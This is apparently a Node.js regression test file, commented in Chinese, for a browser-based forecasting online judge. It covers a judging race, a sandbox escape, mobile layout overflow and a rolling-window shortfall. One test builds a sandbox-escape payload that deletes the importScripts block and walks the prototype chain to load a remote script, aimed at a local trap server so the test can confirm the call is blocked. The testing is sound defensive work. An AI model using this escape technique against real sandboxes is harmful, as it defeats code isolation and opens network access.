/**
 * regressions.test.js —— 把架构师审查报告里的 4 个真实缺陷固化成回归用例
 *
 *   ① 判题竞态：p1 提交后立刻切到 p6，p6 不得显示 p1 的结果 / 不得解锁 p6 题解；
 *   ② 沙箱逃逸：`var g=new Function("return this")(); delete g.importScripts;` 必须拿不到网络能力；
 *   ③ 375px 视口：整页不得横向溢出，顶栏分数胶囊不得越界，表格容器必须可横滑；
 *   ④ rolling 窗口不足：不得静默缩水测试点，必须显式报错并在 UI 给出提示。
 *
 * ①③ 需要真实浏览器（无头 Edge/Chrome + CDP），②④ 另含 Node 侧（fakeworker / 引擎）验证。
 * 每条用例在修复前必须是红的 —— 这是本文件存在的意义。
 */
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const path = require('node:path');
const { pathToFileURL } = require('node:url');
const { loadEngine, makeCase, ROOT } = require('./helpers/engine');
const { installFakeWorker } = require('./helpers/fakeworker');
const { launch, findBrowser } = require('./helpers/cdp');

const { judge } = loadEngine();
const INDEX_URL = pathToFileURL(path.join(ROOT, 'index.html')).href;
const HAS_BROWSER = !!findBrowser();

const P1 = 'p1-naive';
const P6 = 'p6-holt-winters';

let page = null;

test.before(async () => {
  if (!HAS_BROWSER) return;
  page = await launch(INDEX_URL, { timeout: 25000, readyTimeout: 20000 });
});

test.after(() => {
  if (page) page.close();
});

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * 把页面重置到「干净存储 + 指定路由」的状态。
 * @param {string} hash 目标路由
 * @returns {Promise<void>}
 */
async function reset(hash) {
  await page.evaluate(
    '(function(){try{localStorage.clear();localStorage.setItem("tsoj:onboarded","true");}catch(e){}' +
      'location.hash=' + JSON.stringify(hash) + ';})()'
  );
  await page.reload();
  await page.evaluate('location.hash = ' + JSON.stringify(hash));
  await sleep(120);
}

/**
 * 等待页面内条件成立。
 * @param {string} expr 表达式
 * @param {number} [timeout] 毫秒
 * @returns {Promise<boolean>}
 */
async function waitFor(expr, timeout) {
  const end = Date.now() + (timeout || 8000);
  while (Date.now() < end) {
    if (await page.evaluate('!!(' + expr + ')')) return true;
    await sleep(60);
  }
  return false;
}

/* ================================================================== *
 * ① 判题竞态（P0）：结果错页 + 越权解锁题解
 * ================================================================== */

test('① 竞态：p1 提交后立刻切到 p6，p6 不得出现 p1 的判决/分数/题解解锁', async (t) => {
  if (!page) return t.skip('无浏览器');
  await reset('#/problem/' + P1);
  assert.ok(await waitFor('document.querySelector("#view #btnSubmit")'), 'p1 页面未渲染');

  // 点「提交判题」后立刻切路由（同一 tick，远小于 300ms）—— 复现架构师实测的竞态窗口
  await page.evaluate(
    `(function(){
      var ta = document.querySelector('.ed-input');
      ta.value = TSJ.findProblem(${JSON.stringify(P1)}).solution;
      ta.dispatchEvent(new Event('input', { bubbles: true }));
      document.querySelector('#view #btnSubmit').click();
      location.hash = '#/problem/' + ${JSON.stringify(P6)};
    })()`
  );

  assert.ok(await waitFor('document.querySelector("#view #btnReset")'), 'p6 页面未渲染');
  // 留足时间让 p1 的判题 Promise 结算（正常情况下 1~2s 内必然结束）
  await sleep(4000);

  const state = await page.evaluate(
    `(function(){
      var panel = document.querySelector('#view #resultPanel');
      var btn = document.querySelector('#view #btnSolution');
      var prog = {};
      try { prog = JSON.parse(localStorage.getItem('tsoj:progress') || '{}'); } catch (e) { prog = {}; }
      return {
        verdicts: panel ? panel.querySelectorAll('.verdict').length : -1,
        cases: panel ? panel.querySelectorAll('.case').length : -1,
        empty: !!(panel && panel.querySelector('.result-empty')),
        solutionDisabled: btn ? btn.disabled : null,
        progressKeys: Object.keys(prog),
        p6: prog[${JSON.stringify(P6)}] || null,
        p1: prog[${JSON.stringify(P1)}] || null,
        hash: location.hash,
      };
    })()`
  );

  assert.equal(state.hash, '#/problem/' + P6, '应停留在 p6');
  assert.equal(state.verdicts, 0, 'p6 结果面板出现了判决（旧判题结果被画到了新页面）');
  assert.equal(state.cases, 0, 'p6 结果面板出现了逐测试点（旧判题结果被画到了新页面）');
  assert.equal(state.empty, true, 'p6 结果面板应保持空态');
  assert.equal(state.solutionDisabled, true, '未通过 p6 却解锁了题解按钮');
  assert.equal(state.p6, null, 'p6 被写入了不属于它的进度记录：' + JSON.stringify(state.p6));
  // 关于「p1 的进度」：T02 的 P0 修复口径是「token 失配 → 整段丢弃（不碰 DOM、不写存储）」，
  // 因此过期会话连存储也不写（下面这条断言把它固化下来）。核心不变量是「绝不记到 p6 上」：
  // 若将来产品决定「离开页面后仍要落盘」，只需把 persistResult 移到失配分支之前，
  // 并把本条断言改成「keys === ['p1-naive']」—— 但那属于行为变更，需要同步改这条用例。
  assert.deepEqual(state.progressKeys, [], '过期会话不应写任何存储，实际写入：' + JSON.stringify(state.progressKeys));
  assert.equal(state.p1, null, '过期会话不应把 p1 的成绩落盘（T02 整段丢弃口径）');
  assert.deepEqual(page.exceptions, [], '竞态过程出现未捕获异常：' + JSON.stringify(page.exceptions));
});

/* ================================================================== *
 * ② 沙箱逃逸（P0）：delete 掉封禁后必须仍然拿不到网络能力
 * ================================================================== */

/** 逃逸载荷：删掉封禁 → 从全局/原型链上找 importScripts → 真发一次请求 */
function escapePayload(url) {
  return [
    'function predict(history, horizon, ctx) {',
    '  var g = new Function("return this")();',
    '  try { delete g.importScripts; } catch (e) {}',
    '  var t = typeof g.importScripts;',   // 被封时这里会抛「沙箱限制」→ RE
    '  if (t === "function") { g.importScripts(' + JSON.stringify(url) + '); }',
    '  else if (t === "undefined") {',
    '    var p = Object.getPrototypeOf(g);',
    '    var depth = 0;',
    '    while (p && depth < 8) {',
    '      var fn = null;',
    '      try { fn = p.importScripts; } catch (e) { fn = null; }',
    '      if (typeof fn === "function") { fn.call(g, ' + JSON.stringify(url) + '); break; }',
    '      p = Object.getPrototypeOf(p);',
    '      depth++;',
    '    }',
    '  }',
    '  return new Array(horizon).fill(1);',
    '}',
  ].join('\n');
}

test('② 沙箱逃逸（Worker 内）：delete 封禁后 typeof importScripts 必须拿不到函数，且判 RE', async () => {
  const { problem, dataset } = makeCase({ horizon: 4, baselines: ['naive'], threshold: 0.9 }, [1, 1, 1, 1, 1, 1, 2, 2, 2, 2]);
  const fw = installFakeWorker(judge, { hangMs: 400 });
  try {
    const res = await judge.evaluate({
      problem,
      dataset,
      code: escapePayload('http://127.0.0.1:1/leak.js'),
      limits: { perJob: 800, total: 2000 },
    });
    assert.equal(res.verdict, 'RE', '逃逸载荷应被判 RE，实际 ' + res.verdict + '（' + res.message + '）');
    assert.match(String(res.cases[0] && res.cases[0].error), /沙箱限制/, '错误信息应说明沙箱限制');
    assert.deepEqual(fw.stat.canary, [], '竟然真的调用了网络 API：' + JSON.stringify(fw.stat.canary));
  } finally {
    fw.restore();
  }
});

test('② 沙箱逃逸（真实浏览器 + 真实 HTTP 陷阱）：不得产生任何真实网络请求', async (t) => {
  if (!page) return t.skip('无浏览器');
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { 'Content-Type': 'application/javascript' });
    res.end('/*leak*/');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  try {
    await reset('#/problem/' + P1);
    const out = await page.evaluate(
      `(function(){
        var p = TSJ.findProblem(${JSON.stringify(P1)});
        var d = TSJ.findDataset(p.dataset);
        return TSJ.judge.evaluate({ problem: p, dataset: d, code: ${JSON.stringify(
          escapePayload('http://127.0.0.1:' + port + '/leak.js')
        )} });
      })()`,
      true
    );
    await sleep(600); // 给「万一真发出去」的请求留出到达时间
    assert.equal(hits.length, 0, '沙箱内发生了真实网络请求：' + JSON.stringify(hits));
    assert.equal(out.verdict, 'RE', '逃逸载荷应被判 RE，实际 ' + out.verdict + '（' + out.message + '）');
    assert.match(String((out.cases[0] || {}).error || out.message), /沙箱限制/);
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

/* ================================================================== *
 * ③ 375px 视口（P1）：整页不横向溢出、分数胶囊不越界、表格可横滑
 * ================================================================== */

test('③ 375px：documentElement.scrollWidth === 375、score-chip 不越界、.table-wrap 可横滑', async (t) => {
  if (!page) return t.skip('无浏览器');
  await page.send('Emulation.setDeviceMetricsOverride', {
    width: 375,
    height: 812,
    deviceScaleFactor: 1,
    mobile: true,
  });
  try {
    await reset('#/problems');
    await sleep(200);
    const m = await page.evaluate(
      `(function(){
        var chip = document.querySelector('.score-chip');
        var wrap = document.querySelector('.table-wrap');
        var table = document.querySelector('.ptable');
        return {
          docScroll: document.documentElement.scrollWidth,
          docClient: document.documentElement.clientWidth,
          chipRight: chip ? Math.round(chip.getBoundingClientRect().right) : null,
          chipVisible: chip ? chip.getBoundingClientRect().width > 0 : false,
          overflowX: wrap ? getComputedStyle(wrap).overflowX : null,
          wrapScroll: wrap ? wrap.scrollWidth : null,
          wrapClient: wrap ? wrap.clientWidth : null,
          tableScroll: table ? table.scrollWidth : null,
        };
      })()`
    );
    assert.equal(m.docClient, 375, '视口宽度不是 375（CDP 覆盖失败）');
    assert.equal(m.docScroll, 375, '整页出现横向溢出：scrollWidth=' + m.docScroll);
    assert.ok(m.chipVisible, '分数胶囊不可见');
    assert.ok(m.chipRight <= 375, '分数胶囊右边缘越界：' + m.chipRight + ' > 375');
    assert.ok(
      m.overflowX === 'auto' || m.overflowX === 'scroll',
      '.table-wrap 的 overflow-x 必须是 auto/scroll（当前 ' + m.overflowX + '，表格 ' + m.tableScroll + 'px 被裁在 ' + m.wrapClient + 'px 容器里）'
    );
  } finally {
    await page.send('Emulation.clearDeviceMetricsOverride');
  }
});

/* ================================================================== *
 * ④ rolling 窗口不足（P1）：不得静默缩水测试点
 * ================================================================== */

/** 造一个「窗口装不下」的滚动回测题：len=30 < horizon 12 + windows 4 × step 12 = 60 */
function shortRollingCase() {
  const values = [];
  for (let i = 0; i < 30; i++) values.push(1 + (i % 7));
  return makeCase(
    { mode: 'rolling', horizon: 12, windows: 4, originStep: 12, baselines: ['naive'], threshold: 0.9 },
    values
  );
}

test('④ rolling 窗口不足：同步判题必须显式报错，不得静默只留 1 个测试点', () => {
  const { problem, dataset } = shortRollingCase();
  // 先确认 buildTestPoints 确实会缩水（这是缺陷的根因，不许改它）
  const pts = judge.buildTestPoints(dataset.values, {
    mode: 'rolling',
    horizon: 12,
    windows: 4,
    originStep: 12,
    season: 4,
  });
  assert.ok(pts.length < 4, '前置条件：buildTestPoints 会缩水到 ' + pts.length + ' 个点');

  const res = judge.evaluateSync({
    problem,
    dataset,
    code: 'function predict(h,n,c){ return new Array(n).fill(1); }',
  });
  assert.equal(res.dataError, true, '应返回 dataError 标记，实际 ' + JSON.stringify(Object.keys(res)));
  assert.match(String(res.message), /窗口不足|数据点不足/, '错误信息应说明窗口不足，实际：' + res.message);
  assert.deepEqual(res.cases, [], '不得把缩水后的测试点当成正常判题结果');
  assert.equal(res.verdict, 'RE');
});

test('④ rolling 窗口不足：异步判题（浏览器路径）同样必须显式报错，不得静默缩水', async () => {
  const { problem, dataset } = shortRollingCase();
  const res = await judge.evaluate({
    problem,
    dataset,
    code: 'function predict(h,n,c){ return new Array(n).fill(1); }',
  });
  assert.equal(res.dataError, true, '异步判题也应返回 dataError（不能因为先降级/先跑沙箱而掩盖）');
  assert.deepEqual(res.cases, []);
  assert.match(String(res.message), /窗口不足|数据点不足/);
});

test('④ rolling 窗口不足：UI 必须给出提示（结果面板出现 notice，而不是空白或伪分数）', async (t) => {
  if (!page) return t.skip('无浏览器');
  await reset('#/problem/' + P1);
  const out = await page.evaluate(
    `(function(){
      var p = TSJ.findProblem(${JSON.stringify(P1)});
      var values = [];
      for (var i = 0; i < 30; i++) values.push(1 + (i % 7));
      var bad = {
        id: 'qa-short-rolling', index: 99, title: 'QA 窗口不足', difficulty: '入门', tags: [],
        points: 100, passScore: 60, dataset: 'qa', mode: 'rolling',
        horizon: 12, originStep: 12, windows: 4, metric: 'mse',
        baselines: ['naive'], threshold: 0.9
      };
      var ds = { id: 'qa', name: 'QA', unit: 'u', freq: 'D', season: 4, desc: '', values: values };
      return TSJ.judge.evaluate({ problem: bad, dataset: ds, code: 'function predict(h,n,c){return new Array(n).fill(1);}' });
    })()`,
    true
  );
  assert.equal(out.dataError, true, '前置条件：应拿到 dataError 报告');
  // 把这份报告交给结果面板渲染，验证 UI 有明确提示（不静默、不显示伪分数）
  const html = await page.evaluate(
    `(function(){
      var host = document.querySelector('#view #resultPanel');
      TSJ.appUi.renderResult(${JSON.stringify(out)}, TSJ.findProblem(${JSON.stringify(P1)}));
      return { notice: (host.querySelector('.notice') || {}).textContent || '', score: (host.querySelector('.ring-label b') || {}).textContent || '' };
    })()`
  );
  assert.match(html.notice, /窗口不足|数据点不足/, '结果面板没有给出窗口不足提示');
  assert.equal(html.score, '', '数据不足时不应显示任何分数');
});

/* ================================================================== *
 * ⑤ T03 配套：无沙箱时拒绝执行 + 测试点之间互不影响
 * ================================================================== */

test('⑤ 无沙箱环境（Node 无 Worker）：evaluate 必须 refused，绝不降级到主线程跑用户代码', async () => {
  const { problem, dataset } = makeCase({ horizon: 4, baselines: ['naive'], threshold: 0.9 }, [1, 1, 1, 1, 1, 1, 2, 2, 2, 2]);
  assert.equal(judge.canUseSandbox(), false, 'Node 环境不应检测到 Worker');
  const guard = new Promise((_, reject) => setTimeout(() => reject(new Error('3s 内没有返回（疑似降级到同线程跑死循环）')), 3000).unref());
  const res = await Promise.race([
    judge.evaluate({ problem, dataset, code: 'function predict(){ while(true){} }' }),
    guard,
  ]);
  assert.equal(res.refused, true, '应返回 refused:true，实际 ' + JSON.stringify(Object.keys(res)));
  assert.match(String(res.message), /沙箱|Worker/, '应说明沙箱不可用的原因');
  assert.deepEqual(res.cases, [], '拒绝执行时不应产生任何测试点结果');
  assert.equal(res.score, 0);
});

test('⑤ 沙箱：用户代码就地改 history 不会影响下一个测试点（每个测试点独立副本）', async () => {
  const values = [];
  for (let i = 0; i < 12; i++) values.push(1);
  for (let i = 0; i < 4; i++) values.push(2);
  const { problem, dataset } = makeCase(
    { horizon: 4, windows: 2, originStep: 2, mode: 'rolling', baselines: ['naive'], threshold: 0.9 },
    values
  );
  // 返回值 = 各窗口的 history 长度（由 buildTestPoints 给出期望值）。
  // 若隔离失效（两个窗口复用同一数组），第二个窗口会读到「上一个窗口 push 过 999」的长度。
  const code = [
    'function predict(history, horizon, ctx) {',
    '  var len = history.length;',
    '  history.push(999);',
    '  history[0] = -1;',
    '  return new Array(horizon).fill(len);',
    '}',
  ].join('\n');
  const fw = installFakeWorker(judge, { hangMs: 400 });
  try {
    const res = await judge.evaluate({ problem, dataset, code, limits: { perJob: 800, total: 2500 } });
    const expect = judge.buildTestPoints(dataset.values, {
      mode: 'rolling', horizon: 4, windows: 2, originStep: 2, season: 4,
    }).map((p) => p.history.length);
    assert.equal(res.cases.length, 2, '应有 2 个测试点');
    assert.notEqual(expect[0], expect[1], '两个窗口的训练长度应不同，否则测不出污染');
    assert.equal(res.cases[0].predictions[0], expect[0], '第一个窗口 history 长度被改了');
    assert.equal(res.cases[1].predictions[0], expect[1], '第二个窗口读到了被污染的 history 长度');
  } finally {
    fw.restore();
  }
});
